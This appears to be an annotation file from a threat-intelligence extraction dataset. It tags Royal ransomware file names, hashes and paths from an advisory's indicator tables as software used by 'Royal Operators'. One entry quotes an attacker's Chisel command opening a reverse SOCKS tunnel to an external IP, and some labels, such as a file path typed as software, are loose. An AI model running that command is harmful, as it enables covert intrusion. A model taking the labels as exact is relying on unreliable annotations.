@@ -1,0 +1,552 @@
+{
+  "mentions": [
+    {
+      "id": "m001",
+      "text": "runanddelete.bat",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m002",
+      "text": "Royal",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m003",
+      "text": "conhost.exe",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m004",
+      "text": "Ransomware Filepath",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m005",
+      "text": "execute.bat",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m006",
+      "text": "windows_encryptor.exe",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m007",
+      "text": "wine.exe",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m008",
+      "text": "run1.bat",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m009",
+      "text": "run2.bat",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m010",
+      "text": "run3.bat",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m011",
+      "text": "run4.bat",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m012",
+      "text": "sc.bat",
+      "codes": [
+        "S"
+      ]
+    },
+    {
+      "id": "m013",
+      "text": "Royal Operators",
+      "codes": [
+        "G"
+      ]
+    }
+  ],
+  "choices": {
+    "m001_S": {
+      "name": "runanddelete.bat",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m002_S": {
+      "name": "Royal",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m003_S": {
+      "name": "conhost.exe",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m004_S": {
+      "name": "Ransomware Filepath",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m005_S": {
+      "name": "execute.bat",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m006_S": {
+      "name": "windows_encryptor.exe",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m007_S": {
+      "name": "wine.exe",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m008_S": {
+      "name": "run1.bat",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m009_S": {
+      "name": "run2.bat",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m010_S": {
+      "name": "run3.bat",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m011_S": {
+      "name": "run4.bat",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m012_S": {
+      "name": "sc.bat",
+      "type": "Software",
+      "attack_id": null
+    },
+    "m013_G": {
+      "name": "Royal Operators",
+      "type": "ThreatGroup",
+      "attack_id": null
+    }
+  },
+  "units": {
+    "u001": {
+      "start": 0,
+      "end": 16,
+      "text": "runanddelete.bat",
+      "line_start": 0
+    },
+    "u002": {
+      "start": 17,
+      "end": 81,
+      "text": "342B398647073159DFA8A7D36510171F731B760089A546E96FBB8A292791EFEE",
+      "line_start": 17
+    },
+    "u003": {
+      "start": 82,
+      "end": 146,
+      "text": "Royal and BlackSuit IOCs as of June 2023 (New November 13, 2023)",
+      "line_start": 82
+    },
+    "u004": {
+      "start": 147,
+      "end": 224,
+      "text": "Table 6: Royal Ransomware Associated Files, Tools, and Hashes as of June 2023",
+      "line_start": 147
+    },
+    "u005": {
+      "start": 225,
+      "end": 229,
+      "text": "Name",
+      "line_start": 225
+    },
+    "u006": {
+      "start": 230,
+      "end": 263,
+      "text": "Description or SHA 256 Hash Value",
+      "line_start": 230
+    },
+    "u007": {
+      "start": 264,
+      "end": 344,
+      "text": "C:\\Users\\Public\\conhost.exe client 149.28.73.161:443 R:149.28.73.161:43657:socks",
+      "line_start": 264
+    },
+    "u008": {
+      "start": 345,
+      "end": 457,
+      "text": "Executed on the victim’s machine, uses a Chisel client to tunnel traffic through port 443 instead of port 43657.",
+      "line_start": 345
+    },
+    "u009": {
+      "start": 458,
+      "end": 465,
+      "text": "royal_w",
+      "line_start": 458
+    },
+    "u010": {
+      "start": 466,
+      "end": 486,
+      "text": "Encryption extension",
+      "line_start": 466
+    },
+    "u011": {
+      "start": 487,
+      "end": 500,
+      "text": "%PROGRAMDATA%",
+      "line_start": 487
+    },
+    "u012": {
+      "start": 501,
+      "end": 520,
+      "text": "Ransomware Filepath",
+      "line_start": 501
+    },
+    "u013": {
+      "start": 521,
+      "end": 539,
+      "text": "%TEMP%\\execute.bat",
+      "line_start": 521
+    },
+    "u014": {
+      "start": 540,
+      "end": 558,
+      "text": "InstallerV20.8.msi",
+      "line_start": 540
+    },
+    "u015": {
+      "start": 559,
+      "end": 580,
+      "text": "windows_encryptor.exe",
+      "line_start": 559
+    },
+    "u016": {
+      "start": 581,
+      "end": 645,
+      "text": "85087f28a84205e344d7e8e06979e6622fab0cfe1759fd24e38cd0390bca5fa6",
+      "line_start": 581
+    },
+    "u017": {
+      "start": 646,
+      "end": 668,
+      "text": "%PROGRAMDATA%\\wine.exe",
+      "line_start": 646
+    },
+    "u018": {
+      "start": 669,
+      "end": 733,
+      "text": "5b08c02c141eab94a40b56240a26cab7ff07e9a6e760dfde8b8b053a3526f0e6",
+      "line_start": 669
+    },
+    "u019": {
+      "start": 734,
+      "end": 766,
+      "text": "%USERPROFILE%\\Downloads\\run1.bat",
+      "line_start": 734
+    },
+    "u020": {
+      "start": 767,
+      "end": 831,
+      "text": "bc609cf53dde126b766d35b5bcf0a530c24d91fe23633dad6c2c59fd1843f781",
+      "line_start": 767
+    },
+    "u021": {
+      "start": 832,
+      "end": 864,
+      "text": "%USERPROFILE%\\Downloads\\run2.bat",
+      "line_start": 832
+    },
+    "u022": {
+      "start": 865,
+      "end": 929,
+      "text": "13c25164791d3436cf2efbc410caec6b6dd6978d7e83c4766917630e24e1af10",
+      "line_start": 865
+    },
+    "u023": {
+      "start": 930,
+      "end": 962,
+      "text": "%USERPROFILE%\\Downloads\\run3.bat",
+      "line_start": 930
+    },
+    "u024": {
+      "start": 963,
+      "end": 1027,
+      "text": "2b93206d7a36cccdf7d7596b90ead301b2ff7e9a96359f39b6ba31bb13d11f45",
+      "line_start": 963
+    },
+    "u025": {
+      "start": 1028,
+      "end": 1060,
+      "text": "%USERPROFILE%\\Downloads\\run4.bat",
+      "line_start": 1028
+    },
+    "u026": {
+      "start": 1061,
+      "end": 1125,
+      "text": "84e1efbed6bb7720caea6720a8bff7cd93b5d42fb1d71ef8031bfd3897ed4435",
+      "line_start": 1061
+    },
+    "u027": {
+      "start": 1126,
+      "end": 1156,
+      "text": "%USERPROFILE%\\Downloads\\sc.bat",
+      "line_start": 1126
+    },
+    "u028": {
+      "start": 1157,
+      "end": 1221,
+      "text": "e0dbe3a2d07ee10731b68a142c65db077cfb88e5ec5c8415e548d3ede40e7ffc",
+      "line_start": 1157
+    }
+  },
+  "captions": {
+    "ctx3": {
+      "start": 14620,
+      "end": 14671,
+      "text": "Table 5: Batch Script Tools Used by Royal Operators"
+    }
+  },
+  "identities": {
+    "m001_S": "local:Software:runanddelete.bat",
+    "m002_S": "attack:S1073",
+    "m003_S": "local:Software:conhost.exe",
+    "m004_S": "local:Software:ransomware filepath",
+    "m005_S": "local:Software:execute.bat",
+    "m006_S": "local:Software:windows_encryptor.exe",
+    "m007_S": "local:Software:wine.exe",
+    "m008_S": "local:Software:run1.bat",
+    "m009_S": "local:Software:run2.bat",
+    "m010_S": "local:Software:run3.bat",
+    "m011_S": "local:Software:run4.bat",
+    "m012_S": "local:Software:sc.bat",
+    "m013_G": "local:ThreatGroup:royal operators"
+  },
+  "unavailable_choices": [],
+  "evidence_patterns": [
+    {
+      "unit_ids": [
+        "u001"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m001_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u003"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m002_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u004"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m002_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u007"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m003_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u012"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m004_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u013"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m005_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u015"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m006_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u017"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m007_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u019"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m008_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u021"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m009_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u023"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m010_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u025"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m011_S"
+      ]
+    },
+    {
+      "unit_ids": [
+        "u027"
+      ],
+      "context_ids": [
+        "ctx3"
+      ],
+      "heads": [
+        "m013_G"
+      ],
+      "predicate": "USES",
+      "tails": [
+        "m012_S"
+      ]
+    }
+  ]
+}
